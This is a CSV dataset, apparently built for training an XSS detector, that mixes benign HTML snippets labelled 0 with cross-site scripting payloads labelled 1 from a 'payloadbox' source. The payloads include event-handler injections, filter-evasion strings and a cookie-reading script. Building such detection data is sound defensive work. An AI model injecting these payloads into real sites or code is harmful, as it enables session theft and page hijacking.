text,label,source,length,timestamp
"<dl onkeypress=""alert(1)"" contenteditable>test</dl>",1,payloadbox,51,2026-02-09T15:05:27.716766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.740766
"<element ondblclick=""alert(1)"">test</element>",1,payloadbox,45,2026-02-09T15:05:27.716766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.730765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.731765
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,1,payloadbox,49,2026-02-09T15:05:27.714766
"<samp onmouseenter=""alert(1)"">test</samp>",1,payloadbox,41,2026-02-09T15:05:27.720768
<marquee onstart=alert(1)>XSS</marquee>,1,payloadbox,39,2026-02-09T15:05:27.718768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.738766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.736778
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.725769
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.736778
"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",1,payloadbox,56,2026-02-09T15:05:27.720768
<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>,1,payloadbox,71,2026-02-09T15:05:27.720768
"<canvas onpaste=""alert(1)"" contenteditable>test</canvas>",1,payloadbox,56,2026-02-09T15:05:27.715767
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",1,payloadbox,117,2026-02-09T15:05:27.716766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.741766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.736778
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.725769
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",1,payloadbox,162,2026-02-09T15:05:27.721766
<br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,1,payloadbox,145,2026-02-09T15:05:27.725769
"<multicol oncopy=""alert(1)"" contenteditable>test</multicol>",1,payloadbox,59,2026-02-09T15:05:27.719771
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.735774
"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>",1,payloadbox,55,2026-02-09T15:05:27.714766
"<shadow onkeypress=""alert(1)"" contenteditable>test</shadow>",1,payloadbox,59,2026-02-09T15:05:27.720768
"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>",1,payloadbox,56,2026-02-09T15:05:27.718768
"<IMG SRC=""livescript:[code]"">",1,payloadbox,29,2026-02-09T15:05:27.724768
"<dl draggable=""true"" ondragend=""alert(1)"">test</dl>",1,payloadbox,51,2026-02-09T15:05:27.716766
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",1,payloadbox,115,2026-02-09T15:05:27.721766
"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",1,payloadbox,70,2026-02-09T15:05:27.724768
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",1,payloadbox,127,2026-02-09T15:05:27.724768
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.732765
"<element draggable=""true"" ondragenter=""alert(1)"">test</element>",1,payloadbox,63,2026-02-09T15:05:27.716766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",1,payloadbox,107,2026-02-09T15:05:27.721766
<small id=x tabindex=1 onfocusin=alert(1)></small>,1,payloadbox,50,2026-02-09T15:05:27.720768
"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",1,payloadbox,51,2026-02-09T15:05:27.720768
<link onfocusin=alert(1) id=x tabindex=1 style=display:block>,1,payloadbox,61,2026-02-09T15:05:27.718768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.730765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.729765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.732765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.742765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.742765
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",1,payloadbox,105,2026-02-09T15:05:27.716766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,1,payloadbox,60,2026-02-09T15:05:27.722765
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.740766
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationend=""alert(1)""></nextid>",1,payloadbox,97,2026-02-09T15:05:27.722765
"<img onmousemove=""alert(1)"">test</img>",1,payloadbox,38,2026-02-09T15:05:27.718768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.734777
"<iframe draggable=""true"" ondragenter=""alert(1)"">test</iframe>",1,payloadbox,61,2026-02-09T15:05:27.717767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
"<rt onbeforecopy=""alert(1)"" contenteditable>test</rt>",1,payloadbox,53,2026-02-09T15:05:27.720768
<span class='class-5324'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
"<style>@keyframes slidein {}</style><datalist style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></datalist>",1,payloadbox,170,2026-02-09T15:05:27.721766
*/alert(1)</script><script>/*,1,payloadbox,29,2026-02-09T15:05:27.713767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.733766
"<samp oncut=""alert(1)"" contenteditable>test</samp>",1,payloadbox,50,2026-02-09T15:05:27.720768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.734777
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.736778
<span class='class-2004'>Services</span>,0,generated,40,2026-02-09T15:05:27.730765
"<svg draggable=""true"" ondrag=""alert(1)"">test</svg>",1,payloadbox,50,2026-02-09T15:05:27.722765
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></picture>",1,payloadbox,184,2026-02-09T15:05:27.722765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.738766
<span class='class-2884'>Services</span>,0,generated,40,2026-02-09T15:05:27.733766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.729765
"<set attributeName=""xlink:href"" begin=""accessKey(b)"" to=""//example.com/?b"" />",1,payloadbox,77,2026-02-09T15:05:27.725769
<span class='class-6374'>Services</span>,0,generated,40,2026-02-09T15:05:27.743765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.742765
<meter id=x tabindex=1 onfocusin=alert(1)></meter>,1,payloadbox,50,2026-02-09T15:05:27.719771
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",1,payloadbox,114,2026-02-09T15:05:27.721766
"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>",1,payloadbox,103,2026-02-09T15:05:27.716766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.736778
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.726766
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,1,payloadbox,85,2026-02-09T15:05:27.724768
<nav id=x tabindex=1 onfocus=alert(1)></nav>,1,payloadbox,44,2026-02-09T15:05:27.719771
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.731765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.735774
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
"<footer ondblclick=""alert(1)"">test</footer>",1,payloadbox,43,2026-02-09T15:05:27.717767
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,1,payloadbox,78,2026-02-09T15:05:27.715767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.742765
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,1,payloadbox,56,2026-02-09T15:05:27.714766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.730765
"<param oncontextmenu=""alert(1)"">test</param>",1,payloadbox,44,2026-02-09T15:05:27.719771
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.740766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.736778
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.730765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.732765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.736778
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.725769
<span class='class-654'>Services</span>,0,generated,39,2026-02-09T15:05:27.727768
"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>",1,payloadbox,49,2026-02-09T15:05:27.718768
"<title onmousedown=""alert(1)"">test</title>",1,payloadbox,42,2026-02-09T15:05:27.723765
"<content onmousedown=""alert(1)"">test</content>",1,payloadbox,46,2026-02-09T15:05:27.715767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.738766
"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationstart=""alert(1)""></form>",1,payloadbox,95,2026-02-09T15:05:27.722765
"<style>:target {color: red;}</style><rt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rt>",1,payloadbox,107,2026-02-09T15:05:27.721766
<var id=x tabindex=1 onfocusin=alert(1)></var>,1,payloadbox,46,2026-02-09T15:05:27.724768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.741766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.742765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.735774
"<del draggable=""true"" ondragend=""alert(1)"">test</del>",1,payloadbox,53,2026-02-09T15:05:27.715767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.727768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.725769
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.740766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.732765
<span class='class-2284'>Services</span>,0,generated,40,2026-02-09T15:05:27.731765
"<dl onbeforepaste=""alert(1)"" contenteditable>test</dl>",1,payloadbox,54,2026-02-09T15:05:27.716766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.734777
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",1,payloadbox,69,2026-02-09T15:05:27.715767
"<div id=""130""><math href=""javascript:alert(130)"">CLICKME</math>",1,payloadbox,63,2026-02-09T15:05:27.725769
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,1,payloadbox,57,2026-02-09T15:05:27.713767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.739765
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,1,payloadbox,62,2026-02-09T15:05:27.715767
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bgsound>",1,payloadbox,184,2026-02-09T15:05:27.722765
"<div draggable=""true"" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>",1,payloadbox,107,2026-02-09T15:05:27.716766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.739765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.726766
"<meter onpaste=""alert(1)"" contenteditable>test</meter>",1,payloadbox,54,2026-02-09T15:05:27.719771
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.725769
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.739765
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.733766
"<xmp onmouseleave=""alert(1)"">test</xmp>",1,payloadbox,39,2026-02-09T15:05:27.724768
"<i draggable=""true"" ondragleave=""alert(1)"">test</i>",1,payloadbox,51,2026-02-09T15:05:27.717767
<svg><thead onload=alert(1)></thead>,1,payloadbox,36,2026-02-09T15:05:27.723765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.742765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.738766
"<svg onmousedown=""alert(1)"">test</svg>",1,payloadbox,38,2026-02-09T15:05:27.722765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.726766
<html id=x tabindex=1 onactivate=alert(1)></html>,1,payloadbox,49,2026-02-09T15:05:27.717767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.741766
"<dir draggable=""true"" ondragstart=""alert(1)"">test</dir>",1,payloadbox,55,2026-02-09T15:05:27.716766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.736778
<form onsubmit=alert(1)><input type=submit>,1,payloadbox,43,2026-02-09T15:05:27.717767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.744765
<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>,1,payloadbox,76,2026-02-09T15:05:27.717767
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,1,payloadbox,76,2026-02-09T15:05:27.723765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.725769
"<font onmouseleave=""alert(1)"">test</font>",1,payloadbox,41,2026-02-09T15:05:27.717767
"<strong onclick=""alert(1)"">test</strong>",1,payloadbox,40,2026-02-09T15:05:27.721766
"<ins onmouseenter=""alert(1)"">test</ins>",1,payloadbox,39,2026-02-09T15:05:27.718768
"<article oncopy=""alert(1)"" contenteditable>test</article>",1,payloadbox,57,2026-02-09T15:05:27.714766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.735774
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.741766
"<optgroup draggable=""true"" ondragenter=""alert(1)"">test</optgroup>",1,payloadbox,65,2026-02-09T15:05:27.719771
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.739765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.736778
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
"<picture onmouseover=""alert(1)"">test</picture>",1,payloadbox,46,2026-02-09T15:05:27.719771
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.727768
"<bgsound draggable=""true"" ondragstart=""alert(1)"">test</bgsound>",1,payloadbox,63,2026-02-09T15:05:27.714766
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",1,payloadbox,55,2026-02-09T15:05:27.720768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.739765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
<math>,1,payloadbox,6,2026-02-09T15:05:27.725769
"<nextid draggable=""true"" ondragstart=""alert(1)"">test</nextid>",1,payloadbox,61,2026-02-09T15:05:27.719771
"<header onbeforecut=""alert(1)"" contenteditable>test</header>",1,payloadbox,60,2026-02-09T15:05:27.717767
"<sup draggable=""true"" ondragenter=""alert(1)"">test</sup>",1,payloadbox,55,2026-02-09T15:05:27.722765
"<param onkeypress=""alert(1)"" contenteditable>test</param>",1,payloadbox,57,2026-02-09T15:05:27.719771
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.738766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.732765
"<i oncopy=""alert(1)"" contenteditable>test</i>",1,payloadbox,45,2026-02-09T15:05:27.717767
"<footer onkeypress=""alert(1)"" contenteditable>test</footer>",1,payloadbox,59,2026-02-09T15:05:27.717767
"<aside onpaste=""alert(1)"" contenteditable>test</aside>",1,payloadbox,54,2026-02-09T15:05:27.714766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
"<style>@keyframes x{}</style><link style=""animation-name:x"" onanimationstart=""alert(1)""></link>",1,payloadbox,95,2026-02-09T15:05:27.722765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.734777
"<basefont onmouseenter=""alert(1)"">test</basefont>",1,payloadbox,49,2026-02-09T15:05:27.714766
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",1,payloadbox,56,2026-02-09T15:05:27.723765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.738766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.737767
"<picture><source srcset=""validimage.png""><image onloadstart=alert(1)></picture>",1,payloadbox,79,2026-02-09T15:05:27.719771
"<ul onbeforepaste=""alert(1)"" contenteditable>test</ul>",1,payloadbox,54,2026-02-09T15:05:27.723765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.737767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.730765
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1,payloadbox,52,2026-02-09T15:05:27.724768
"<style draggable=""true"" ondrag=""alert(1)"">test</style>",1,payloadbox,54,2026-02-09T15:05:27.721766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.739765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.743765
"<select onkeypress=""alert(1)"" contenteditable>test</select>",1,payloadbox,59,2026-02-09T15:05:27.720768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.736778
